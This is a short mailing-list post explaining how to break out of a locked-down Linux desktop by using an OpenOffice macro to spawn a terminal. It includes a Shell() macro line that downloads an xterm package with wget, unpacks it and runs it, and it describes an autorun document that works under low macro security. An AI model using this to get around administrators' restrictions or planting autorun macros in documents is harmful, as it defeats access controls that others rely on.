Subject: Spawn a terminal using OpenOffice,
	just for funzies.

Some friends asked me some tips for how to make a locked down machine that
doesn't allow the user to execute anything from the GUI and doesn't have a
terminal emulator installed into starting a terminal, using an allowed
application, OpenOffice. The below is hardly a security vulnerability
(unless you count "if the GUI can't do it, then the user can't either!" a
real security attempt), but it is a method that could be helpful in making
different sorts of things this mailing list seems to like. So here ya go.

Howdy Boys and Girls,

So you want to use OpenOffice.org to spawn a command line terminal on a
computer that has no X terminal emulator installed or an easy way to run
apps, eh?

*Method 1:
*Run the macro in a new document.
See method-1.ogv <http://data.zx2c4.com/openoffice-execute/method-1.ogv>

*Method 2:
*Have the macro autorun from a preexisting file. Downside: requires low
macro security option.
See method-2.ogv <http://data.zx2c4.com/openoffice-execute/method-2.ogv>
See terminal-spawn.odt<http://data.zx2c4.com/openoffice-execute/terminal-spawn.odt>

Helpful macro snippet:
Shell("sh -c 'dir=`mktemp -d`; cd $dir; wget
http://mirror.pnl.gov/ubuntu//pool/main/x/xterm/xterm_256-1ubuntu1_i386.deb;
ar x xterm_256-1ubuntu1_i386.deb; tar xzf data.tar.gz; cd /;
$dir/usr/bin/xterm & rm -rf $dir'", 1)

Have fun with this trick.

Jason
